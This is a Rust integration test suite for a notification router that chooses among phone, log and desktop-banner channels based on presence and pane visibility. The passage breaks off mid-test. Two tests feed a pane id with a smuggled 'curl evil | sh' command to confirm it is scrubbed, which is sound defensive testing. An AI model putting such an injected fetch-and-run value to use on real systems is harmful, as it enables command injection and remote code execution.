//! Which channels an event reaches, driven through the real binary.
//!
//! `PNS_CHANNELS_DIR` points the engine at stub executables that record the
//! event they were handed, which is what lets these pin routing, the
//! rendered event, the pane scrub and the exit-0 edge without a network, a
//! key or a sleep. The native plugins are the other half, in native.rs.

mod support;

use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;
use std::os::unix::fs::FileTypeExt;
use support::{
    KEYS_DISAGREE, RouterStub, Sandbox, router_table, run, stderr, stdout, write_script,
};

// --- the alert path ---------------------------------------------------------

#[test]
fn away_from_the_desk_cards_the_phone_and_logs_but_raises_no_banner() {
    // Matrix row "away: phone card regardless of any client's display". The
    // banner belongs to the desk, and nobody is at it: a banner nobody sees
    // was the old always-on rule this replaced.
    let sandbox = Sandbox::new("alert-path");
    run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done"])
        .args(["--project", "dotfiles", "--detail", "a summary"]));
    assert!(sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(!sandbox.fired("macos-banner"), "away raises no banner");
}

#[test]
fn at_the_desk_with_the_pane_out_of_sight_the_banner_is_the_whole_delivery() {
    // Matrix row "desk, origin hidden: banner". No card, because the operator
    // is right here.
    let sandbox = Sandbox::new("desk-hidden");
    let mut command = sandbox.pns();
    command.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut command, false);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("macos-banner"));
    assert!(sandbox.fired("hermes"));
    assert!(!sandbox.fired("moshi"), "the desk gets no card");
}

#[test]
fn at_the_desk_watching_the_pane_only_the_log_fires() {
    // Matrix row "desk watching: suppressed entirely". The pane is on screen,
    // so the event is already in front of the operator.
    let sandbox = Sandbox::new("desk-watching");
    let mut command = sandbox.pns();
    command.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut command, true);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(!sandbox.fired("macos-banner"), "the pane is in plain sight");
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
}

#[test]
fn the_alert_path_labels_the_hermes_leg_silent_on_the_wire() {
    // The NAME is the whole claim. This used to say delivery stayed off the
    // caller's critical path, which it never checked and which is not true
    // anyway: the dispatch waits for the channel either way. What the label
    // selects is whether the leg reports its outcome.
    let sandbox = Sandbox::new("hermes-async");
    run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert_eq!(sandbox.event("hermes")["mode"], "async");
}

#[test]
fn a_channel_is_handed_the_rendered_event_not_the_raw_arguments() {
    let sandbox = Sandbox::new("rendered-event");
    run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done"])
        .args(["--project", "dotfiles", "--branch", "main"])
        .args(["--detail", "a summary"]));
    let event = sandbox.event("moshi");
    assert_eq!(event["agent"], "claude");
    for rendered in ["title", "message", "preview"] {
        // A MISSING key indexes to Null, and Null is != "", so the absence
        // has to be refused by type rather than by inequality.
        assert!(
            event[rendered]
                .as_str()
                .is_some_and(|value| !value.is_empty()),
            "{rendered} must be a non-empty rendered string: {event}"
        );
    }
}

// --- the narrowing flags ----------------------------------------------------

#[test]
fn local_only_keeps_the_banner_and_reaches_nothing_off_the_machine() {
    let sandbox = Sandbox::new("local-only");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .arg("--local-only"));
    assert!(sandbox.fired("macos-banner"));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("hermes"));
}

#[test]
fn remote_only_delivers_through_hermes_alone() {
    let sandbox = Sandbox::new("remote-only");
    run(sandbox
        .pns()
        .args(["--agent", "weekly", "--state", "done"])
        .args(["--project", "skills", "--detail", "ran", "--remote-only"]));
    assert!(sandbox.fired("hermes"));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"));
}

#[test]
fn hermes_is_sync_on_the_log_path_which_is_what_makes_an_undelivered_entry_visible() {
    let sandbox = Sandbox::new("hermes-sync");
    run(sandbox
        .pns()
        .args(["--agent", "weekly", "--state", "done", "--detail", "ran"])
        .arg("--remote-only"));
    assert_eq!(sandbox.event("hermes")["mode"], "sync");
}

#[test]
fn both_narrowing_flags_together_deliver_nothing_and_say_so() {
    let sandbox = Sandbox::new("both-flags");
    let output = run(sandbox
        .pns()
        .args(["--agent", "x", "--state", "done", "--detail", "y"])
        .args(["--local-only", "--remote-only"]));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("hermes"));
    assert!(!sandbox.fired("macos-banner"));
    assert!(stdout(&output).contains("SKIPPED"), "{output:?}");
}

// --- presence ---------------------------------------------------------------

#[test]
fn at_the_desk_the_phone_is_skipped_and_only_the_phone() {
    let sandbox = Sandbox::new("at-the-desk");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn relay_skip_phone_drops_the_phone_and_only_the_phone() {
    // The caller has already raised the card on the phone through moshi-hook's
    // own round trip, so the push here would be the same event twice; the
    // banner and the paper trail are still wanted.
    let sandbox = Sandbox::new("skip-phone");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_SKIP_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn relay_skip_phone_beats_relay_force_phone() {
    // "I have already sent it" is more specific than a standing override, and
    // the override is the one thing that could reintroduce the double push.
    let sandbox = Sandbox::new("skip-beats-force");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_SKIP_PHONE", "1")
        .env("PNS_FORCE_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

#[test]
fn relay_force_phone_overrides_presence() {
    let sandbox = Sandbox::new("force-phone");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_FORCE_PHONE", "1")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("moshi"));
}

// --- a channel's own failures -----------------------------------------------

#[test]
fn a_channel_that_fails_neither_fails_the_caller_nor_suppresses_its_siblings() {
    let sandbox = Sandbox::new("channel-fails");
    sandbox.stub_channel("moshi", "exit 9");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn an_absent_channel_is_simply_not_installed() {
    let sandbox = Sandbox::new("absent-channel");
    std::fs::remove_file(sandbox.root.join("channels/hermes.sh")).expect("remove the channel");
    let output = run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("macos-banner"));
    // AND IT IS STILL A NON-EVENT. hermes runs sync on this path, so a launch
    // failure that reported itself would print here; the hand-run check is the
    // only caller that reads one.
    assert_eq!(
        stdout(&output),
        "",
        "a channel nobody installed is not news on the notification path"
    );
}

// --- the attention override -------------------------------------------------

#[test]
fn a_back_tap_newer_than_the_last_desk_input_moves_the_operator_to_mobile() {
    // Matrix row "tap newer than the last desk input wins: mobile". The
    // marker is a file the phone touches; nothing else has to know why.
    let sandbox = Sandbox::new("tap-newer");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "300")
        .env("PNS_PHONE_MARKER_FILE", &marker)
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"), "mobile never banners");
}

#[test]
fn desk_input_after_the_tap_cancels_it() {
    // Matrix row "desk input AFTER the tap cancels it": newest signal wins,
    // which is what retired the marker's fixed five-minute TTL.
    let sandbox = Sandbox::new("tap-cancelled");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    let mut command = sandbox.pns();
    command
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_PHONE_MARKER_FILE", &marker);
    sandbox.stub_herdr(&mut command, false);
    run(command
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(!sandbox.fired("moshi"), "the desk is newer than the tap");
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn a_tap_with_moshi_closed_cards_the_phone_even_with_the_pane_in_plain_sight() {
    // Drill D6, run (i), 2026-08-19: Back Tap with moshi closed produced
    // NOTHING. The tap moved the surface to mobile, the origin pane sat
    // focused on the desk display nobody was at, and mobile-plus-visible
    // suppressed. `pns()` states the phone's pty clock as a day untouched,
    // which is exactly the closed-moshi half of the repro.
    let sandbox = Sandbox::new("tap-moshi-closed");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    let mut command = sandbox.pns();
    command
        .env("PNS_IDLE_SECS", "300")
        .env("PNS_PHONE_MARKER_FILE", &marker);
    sandbox.stub_herdr(&mut command, true);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("moshi"), "the tap asked for the card");
    assert!(!sandbox.fired("macos-banner"), "mobile never banners");
}

#[test]
fn a_narrowing_flag_still_beats_a_fresh_tap() {
    let sandbox = Sandbox::new("tap-local-only");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "300")
        .env("PNS_PHONE_MARKER_FILE", &marker)
        .arg("--local-only")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

#[test]
fn skip_phone_still_beats_a_fresh_tap() {
    let sandbox = Sandbox::new("tap-skip");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "300")
        .env("PNS_PHONE_MARKER_FILE", &marker)
        .env("PNS_SKIP_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

// --- the pane the operator is looking at ------------------------------------

#[test]
fn a_phone_in_hand_watching_the_pane_gets_nothing_but_the_log() {
    // Matrix row "mobile watching: suppressed". The card would describe the
    // pane already filling the phone's screen.
    let sandbox = Sandbox::new("watched-pane");
    let mut command = sandbox.pns();
    command.env("PNS_PHONE_INPUT_AGE", "0");
    sandbox.stub_herdr(&mut command, true);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"), "mobile never banners");
    assert!(sandbox.fired("hermes"));
}

#[test]
fn a_phone_in_hand_showing_another_tab_still_cards() {
    // Matrix row "mobile, origin hidden: card only".
    let sandbox = Sandbox::new("other-pane");
    let mut command = sandbox.pns();
    command.env("PNS_PHONE_INPUT_AGE", "0");
    sandbox.stub_herdr(&mut command, false);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"));
}

#[test]
fn an_unreadable_view_delivers_rather_than_suppressing_on_doubt() {
    // Matrix row "desk, visibility unknown: deliver, never suppress on
    // doubt". No herdr on PATH at all, which is the probe failing.
    let sandbox = Sandbox::new("unknown-view");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn force_phone_is_caller_intent_and_beats_the_whole_surface_model() {
    let sandbox = Sandbox::new("force-phone-watched");
    let mut command = sandbox.pns();
    command
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_FORCE_PHONE", "1");
    sandbox.stub_herdr(&mut command, true);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("moshi"));
}

#[test]
fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
    let sandbox = Sandbox::new("pane-scrub");
    let output = run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "wW:p1; curl evil | sh"]));
    assert!(sandbox.fired("macos-banner"));
    assert_eq!(sandbox.event("macos-banner")["pane"], "");
    assert!(
        stderr(&output).contains("dropped a pane id with shell metacharacters"),
        "{output:?}"
    );
}

#[test]
fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
    let sandbox = Sandbox::new("scrub-silent");
    let output = run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done"])
        .args(["--pane", "wW:p1; curl evil | sh"])
        .args(["--local-only", "--remote-only"]));
    assert!(!stderr(&output).contains("dropped a pane id"), "{output:?}");
}

#[test]
fn a_non_unicode_argument_never_breaks_the_exit_zero_edge() {
    // The engine sits on an always-exit-0 path; a stray byte in argv must
    // degrade like any unknown token, not abort the notification.
    let sandbox = Sandbox::new("non-unicode");
    let output = run(sandbox
        .pns()
        .arg(OsStr::from_bytes(&[0xff]))
        .args(["--local-only", "--remote-only"]));
    assert!(stdout(&output).contains("SKIPPED"), "{output:?}");
}

#[test]
fn the_delivered_event_is_newline_terminated_for_line_oriented_channels() {
    let sandbox = Sandbox::new("newline-terminated");
    sandbox.stub_channel(
        "hermes",
        &format!(
            "set -e\nIFS= read -r event\nprintf %s \"$event\" >\"{}/line.event\"",
            sandbox.display()
        ),
    );
    run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    let line = std::fs::read_to_string(sandbox.path("line.event")).expect("one whole line");
    let parsed: serde_json::Value = serde_json::from_str(&line).expect("a whole JSON line");
    assert_eq!(parsed["agent"], "claude");
}

#[test]
fn a_watch_card_toggle_of_the_wrong_type_is_refused_out_loud() {
    // The config layer refuses a non-boolean `enabled` by name, and a plugin
    // SETTING that quietly reads false is the same defect one level down: an
    // operator who wrote true in quotes got no card and no reason for it.
    let sandbox = Sandbox::new("watch-card-wrong-type");
    std::fs::create_dir_all(sandbox.path(".config/pns")).expect("config dir");
    std::fs::write(
        sandbox.path(".config/pns/config.toml"),
        "[plugins.moshi]\nenabled = true\nmobile_watch_card = \"true\"\n\
         [plugins.hermes]\nenabled = true\n",
    )
    .expect("config");
    let mut command = sandbox.pns();
    command.env("PNS_PHONE_INPUT_AGE", "0");
    sandbox.stub_herdr(&mut command, true);
    let output = run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"]));
    assert!(
        stderr(&output).contains("mobile_watch_card"),
        "the refusal names the setting: {output:?}"
    );
    assert!(
        !sandbox.fired("moshi"),
        "and the card stays off, which is the default it fell back to"
    );
}

#[test]
fn a_broken_config_says_so_in_pulse_mode_too_instead_of_dying_quietly() {
    // Event mode has always printed the sanitized warning for a config it
    // could not read. Pulse mode collapsed unreadable and malformed together
    // with absent into one silent no-op, so the operator's only signal that a
    // config was broken was lights that stopped working.
    let sandbox = support::Sandbox::new("pulse-broken-config");
    std::fs::create_dir_all(sandbox.path(".config/pns")).expect("config dir");
    std::fs::write(
        sandbox.path(".config/pns/config.toml"),
        "this is not toml\n",
    )
    .expect("config");
    let output = sandbox
        .bare()
        .args(["pulse", "1"])
        .output()
        .expect("the engine runs");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("pns: config error"),
        "a broken config is loud in pulse mode: {stderr}"
    );
    assert!(output.status.success(), "and still exits zero");
}

#[test]
fn an_absent_config_stays_silent_in_pulse_mode() {
    // The other half of the rule: absent is not broken. A machine that never
    // opted into a config must not be nagged on every long command.
    let sandbox = support::Sandbox::new("pulse-absent-config");
    let output = sandbox
        .bare()
        .args(["pulse", "0"])
        .output()
        .expect("the engine runs");
    assert_eq!(String::from_utf8_lossy(&output.stderr), "");
    assert_eq!(String::from_utf8_lossy(&output.stdout), "");
    assert!(output.status.success());
}

/// Wait for a child with a deadline, killing it if it outlives one. The suite
/// must not be able to hang on a test whose whole point is a blocking read.
fn wait_bounded(mut child: std::process::Child, limit: std::time::Duration) -> Option<i32> {
    let deadline = std::time::Instant::now() + limit;
    loop {
        if let Some(status) = child.try_wait().expect("wait") {
            return status.code();
        }
        if std::time::Instant::now() >= deadline {
            let _ = child.kill();
            let _ = child.wait();
            return None;
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

#[test]
fn an_unknown_plugin_never_resurrects_a_disabled_pulse() {
    // The full-roster fallback is an EVENT-mode rule: it keeps notifications
    // working when a config is wrong. Applying it to the pulse turns a
    // deliberate `enabled = false` back on over an unrelated typo elsewhere.
    //
    // A pulse is silent either way, so the bridge address IS the observation:
    // a listener nobody should ever reach.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("listener");
    let port = listener.local_addr().expect("addr").port();
    listener.set_nonblocking(true).expect("nonblocking");

    let sandbox = support::Sandbox::new("pulse-disabled-plus-typo");
    std::fs::create_dir_all(sandbox.path(".config/pns")).expect("config dir");
    std::fs::write(
        sandbox.path(".config/pns/config.toml"),
        format!(
            "[plugins.hue]\nenabled = false\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
             [plugins.typo]\nenabled = true\n"
        ),
    )
    .expect("config");
    let child = sandbox
        .bare()
        .args(["pulse", "1"])
        .spawn()
        .expect("the engine starts");
    assert_eq!(
        wait_bounded(child, std::time::Duration::from_secs(2)),
        Some(0),
        "a disabled pulse exits at once rather than talking to a bridge"
    );
    assert!(
        matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock),
        "a disabled pulse must not reach the bridge, whatever else the config got wrong"
    );
}

#[test]
fn the_pulse_config_warning_says_what_pulse_mode_actually_did() {
    // The full line, not its prefix: the old suffix promised every built-in
    // plugin would run, which is an event-mode sentence and false here.
    let sandbox = support::Sandbox::new("pulse-warning-wording");
    std::fs::create_dir_all(sandbox.path(".config/pns")).expect("config dir");
    std::fs::write(
        sandbox.path(".config/pns/config.toml"),
        "this is not toml\n",
    )
    .expect("config");
    let output = sandbox
        .bare()
        .args(["pulse", "1"])
        .output()
        .expect("the engine runs");
    assert_eq!(
        String::from_utf8_lossy(&output.stderr).trim_end(),
        "pns: config error (key with no value, expected `=` at line 1); no pulse",
        "the pulse warning names the pulse outcome"
    );
    assert!(output.status.success());
}

#[test]
fn the_binarys_own_roster_knows_the_router_sensor() {
    // The composition root registers the SAME roster the library's tests run
    // against, so `[plugins.router]` is a known plugin to the real binary. A
    // registry built separately in main would call the operator's correct
    // spelling a typo, warn, and fall back to every built-in, which is how a
    // deliberate selection turns into a delivery nobody asked for.
    let sandbox = Sandbox::new("roster-knows-router");
    // A RECORDING stub under the sensor's own name, so a router registered as
    // a channel has something to reach and leaves a trace. Without it the
    // rogue leg execs a channel script that does not exist, the engine
    // shrugs at a missing channel, and every assertion below still passes.
    sandbox.stub_channel(
        "router",
        &format!("cat >\"{}/router.event\"", sandbox.display()),
    );
    sandbox.write_config(
        "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n[plugins.hermes]\nenabled = true\n",
    );
    let output = run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(
        !stderr(&output).contains("unknown plugin"),
        "the sensor is registered, not a typo: {output:?}"
    );
    assert!(sandbox.fired("hermes"), "the selection still delivers");
    assert!(
        !sandbox.fired("moshi"),
        "and nothing fell back to the whole roster"
    );
    assert!(
        !sandbox.fired("router"),
        "the roster registers router as a SENSOR: an input carries no routing, \
         so no event can be delivered to it"
    );
}

// --- the home probe's diagnostic --------------------------------------------

/// The same three identifiers, all on one client again.
const KEYS_AGREE: &str = r#"{"data":[
    {"name":"mister-2","ipAddress":"192.168.1.248","macAddress":"2e:11:ab:6d:b0:4f"}]}"#;

/// A complete listing carrying none of the configured identifiers: the device
/// is out of the house, which is the most ordinary reading this probe takes.
const KEYS_AWAY: &str = r#"{"data":[
    {"name":"mouse","ipAddress":"192.168.1.3","macAddress":"60:82:46:3c:fb:01"}]}"#;

/// The router's captive-portal page, which is every unreachable or unreadable
/// answer this probe can get.
const NO_LISTING: &str = "<html>router login</html>";

/// That table with a channel to deliver on: the probe now RAISES the stale
/// warning as well as printing it, and a config selecting only the sensor
/// would plan no legs at all, so every one of these would pass without ever
/// exercising a delivery.
fn stale_config(router_url: &str) -> String {
    format!(
        "[plugins.hermes]\nenabled = true\n{}",
        router_table(router_url)
    )
}

/// The engine reading the home probe, in the ONLY environment these may run
/// in.
///
/// THE DIAGNOSTIC DELIVERS NOW, so `bare()` is no longer safe here: it reaches
/// the native plugins, walks the developer's own presence probes and, with a
/// hermes key in the config, posts to the operator's REAL gateway. `pns()`
/// points every channel at a recording stub and pins the presence readings,
/// and the URL is pinned at a port nothing listens on as well, so no path
/// through this file can resolve hermes to the live gateway.
fn home_probe(sandbox: &Sandbox) -> std::process::Command {
    let mut probe = sandbox.pns();
    probe.env("PNS_HERMES_URL", "http://127.0.0.1:1/webhooks/nowhere");
    probe.arg("home");
    probe
}

/// The hermes stub replaced by one that APPENDS a line per delivery.
///
/// ONE ALERT PER EPISODE IS A COUNT, and the shared stub overwrites: a second
/// delivery would be indistinguishable from the first, and a run that
/// delivered nothing at all still leaves the previous run's file sitting
/// there reading as a delivery.
fn count_alerts(sandbox: &Sandbox) {
    sandbox.stub_channel(
        "hermes",
        &format!("cat >>\"{}/hermes.events\"", sandbox.display()),
    );
}

/// Every alert delivered so far, parsed, in order. The engine terminates each
/// event with a newline, so one delivery is one line.
fn alerts(sandbox: &Sandbox) -> Vec<serde_json::Value> {
    std::fs::read_to_string(sandbox.path("hermes.events"))
        .unwrap_or_default()
        .lines()
        .filter(|line| !line.trim().is_empty())
        .map(|line| serde_json::from_str(line).expect("one delivered event per line"))
        .collect()
}

const STALE_EVIDENCE: &str = "home: on the home network (matched by device_mac \"2e:11:ab:6d:b0:4f\")\n\
     home:   device_mac \"2e:11:ab:6d:b0:4f\" matched the client the verdict names\n\
     home:   device_hostname \"mister-2\" matched no client\n\
     home:   device_ipv4 \"192.168.1.248\" matched a different client \"mouse\"";

const STALE_WARNING: &str =
    "home: an identifier looks stale: device_hostname, device_ipv4 disagree with device_mac";

#[test]
fn the_home_diagnostic_always_shows_the_evidence_and_warns_once_per_stale_state() {
    // THE MEMORY IS A REAL FILE under a real HOME, which is the one edge this
    // slice adds: the dedupe is only worth anything if a LATER run of the
    // binary reads what this one wrote.
    let sandbox = Sandbox::new("home-staleness");
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&stale_config(&router.url()));
    // RAW STDOUT, trailing newline and all: "the diagnostic is unchanged" is a
    // claim about the BYTES, and a trim would hide a blank line growing on the
    // end of every line this file pins.
    let home = || {
        let mut probe = home_probe(&sandbox);
        stdout(&run(&mut probe)).to_string()
    };
    let evidence = STALE_EVIDENCE;
    let warning = STALE_WARNING;
    let memory = sandbox.path(".local/state/pns/home-staleness");

    assert_eq!(home(), format!("{evidence}\n{warning}\n"));
    assert_eq!(
        std::fs::read_to_string(&memory)
            .expect("the episode is remembered")
            .trim(),
        "device_mac device_hostname=none device_ipv4=other"
    );
    // A REPEAT still tells the whole truth and says the warning no more.
    assert_eq!(home(), format!("{evidence}\n"));
    // RESOLVED: the memory is forgotten rather than left to suppress the next
    // episode, and the state is news again when it comes back.
    router.set_listing(KEYS_AGREE);
    assert_eq!(
        home(),
        "home: on the home network (matched by device_mac \"2e:11:ab:6d:b0:4f\")\n\
         home:   device_mac \"2e:11:ab:6d:b0:4f\" matched the client the verdict names\n\
         home:   device_hostname \"mister-2\" matched the client the verdict names\n\
         home:   device_ipv4 \"192.168.1.248\" matched the client the verdict names\n"
    );
    assert!(!memory.exists(), "a resolved episode is forgotten");
    router.set_listing(KEYS_DISAGREE);
    assert_eq!(home(), format!("{evidence}\n{warning}\n"));

    // AWAY IS NOT RESOLVED. Leaving the house says nothing about the
    // identifiers: every key matches nothing because the device is not on the
    // wifi, so the live episode survives the trip and the homecoming is quiet.
    // Without this the warning is once per HOMECOMING, which for a phone is
    // once a day.
    router.set_listing(KEYS_AWAY);
    assert_eq!(
        home(),
        "home: NOT on the home network (no configured identifier matched a client)\n\
         home:   device_mac \"2e:11:ab:6d:b0:4f\" matched no client\n\
         home:   device_hostname \"mister-2\" matched no client\n\
         home:   device_ipv4 \"192.168.1.248\" matched no client\n"
    );
    assert!(
        memory.exists(),
        "leaving the house does not resolve a disagreement"
    );
    router.set_listing(KEYS_DISAGREE);
    assert_eq!(home(), format!("{evidence}\n"));

    // AN UNREADABLE ANSWER searched nothing at all, so it cannot have found
    // the disagreement gone either. A five-second router timeout must not
    // rearm the warning.
    router.set_listing(NO_LISTING);
    assert_eq!(
        home(),
        "home: unknown (router unreachable or its answer unreadable)\n"
    );
    assert!(
        memory.exists(),
        "an unreadable answer does not resolve a disagreement"
    );
    router.set_listing(KEYS_DISAGREE);
    assert_eq!(home(), format!("{evidence}\n"));
}

#[test]
fn a_state_directory_that_cannot_be_used_leaves_the_whole_diagnostic_standing() {
    // THE MEMORY IS THIS SLICE'S ONE EDGE and it is FAIL-QUIET: a state
    // directory that is a regular FILE breaks every read and every write of
    // it, and the verdict, the evidence, the warning and the exit code must
    // not notice. `run` asserts the exit 0, which is the half a stray
    // `unwrap` would take out.
    let sandbox = Sandbox::new("home-unusable-state");
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&stale_config(&router.url()));
    let blocked = sandbox.path("state-is-a-file");
    std::fs::write(&blocked, "not a directory\n").expect("a file where the state dir would go");
    let home = || {
        let mut probe = home_probe(&sandbox);
        probe.env("PNS_STATE_DIR", &blocked);
        stdout(&run(&mut probe)).to_string()
    };

    assert_eq!(home(), format!("{STALE_EVIDENCE}\n{STALE_WARNING}\n"));
    // The DOCUMENTED COST, pinned so it stays a cost and not a crash:
    // nothing could be remembered, so the same state is news again. A run
    // that went quiet here would mean a write had silently succeeded
    // somewhere this test cannot see.
    assert_eq!(home(), format!("{STALE_EVIDENCE}\n{STALE_WARNING}\n"));
    assert!(blocked.is_file(), "the blocking file is left as it was");
}

// --- the stale warning, delivered -------------------------------------------

#[test]
fn a_new_stale_state_is_delivered_as_one_alert_carrying_the_warning_sentence() {
    // THE WARNING BECOMES A NOTIFICATION. The same condition that prints the
    // sentence hands it to the engine as an ordinary event, so the hand run
    // that prints the warning now delivers it too. NOTHING SCHEDULES `pns
    // home` yet, so a stale identifier still waits for someone to type the
    // command; what this closes is the reach past that one terminal, and the
    // scheduling is later work.
    let sandbox = Sandbox::new("home-stale-alert");
    count_alerts(&sandbox);
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&stale_config(&router.url()));
    let mut probe = home_probe(&sandbox);
    let output = run(&mut probe);

    // THE DIAGNOSTIC IS UNCHANGED, byte for byte: it grew a consumer, not a
    // new way of saying things. RAW, so "byte for byte" means it, down to the
    // single newline `println!` ends the report with.
    assert_eq!(
        stdout(&output),
        format!("{STALE_EVIDENCE}\n{STALE_WARNING}\n")
    );
    let delivered = alerts(&sandbox);
    assert_eq!(delivered.len(), 1, "one state, one alert: {delivered:?}");
    let alert = &delivered[0];
    // THE SAME SENTENCE the terminal printed, because both read it out of
    // `stale_warning`.
    assert_eq!(alert["detail"], STALE_WARNING);
    assert_eq!(alert["message"], STALE_WARNING);
    // An event ABOUT the reading, not from an agent: the title says which
    // subsystem and what happened.
    assert_eq!(alert["title"], "pns \u{b7} stale");
    assert_eq!(alert["agent"], "pns");
    assert_eq!(alert["state"], "stale");
    // No pane to focus, no project and no branch: nothing here came from a
    // terminal or a repository.
    assert_eq!(alert["pane"], "");
    assert_eq!(alert["project"], "");
    assert_eq!(alert["branch"], "");
}

#[test]
fn the_same_stale_state_alerts_once_and_a_returning_one_alerts_again() {
    // ONE MEMORY, ONE DECISION: the file that decides whether the sentence is
    // printed is the file that decides whether it is delivered, so the alert
    // cannot fire on a state the operator was already told about, and cannot
    // stay silent about one they were not.
    let sandbox = Sandbox::new("home-stale-alert-once");
    count_alerts(&sandbox);
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&stale_config(&router.url()));
    let home = || {
        let mut probe = home_probe(&sandbox);
        run(&mut probe);
    };

    home();
    assert_eq!(alerts(&sandbox).len(), 1, "the first sighting is news");
    home();
    assert_eq!(
        alerts(&sandbox).len(),
        1,
        "the same state again is news to nobody"
    );
    // RESOLVED is not an alert either: an all-clear for a warning the
    // operator may never have read is one more thing to read.
    router.set_listing(KEYS_AGREE);
    home();
    assert_eq!(alerts(&sandbox).len(), 1, "a resolved state says nothing");
    // And the episode coming BACK is news again, which is the half a memory
    // that was never cleared would lose.
    router.set_listing(KEYS_DISAGREE);
    home();
    assert_eq!(
        alerts(&sandbox).len(),
        2,
        "the state returned, so it is news again"
    );
}

#[test]
fn only_a_home_reading_alerts_and_the_sensor_is_never_a_destination() {
    // AWAY AND UNREADABLE HAVE NO OPINION about the identifiers, one layer up
    // from the memory rule they already obey: every key matching nothing is
    // what being out of the house IS, and a router timeout searched nothing at
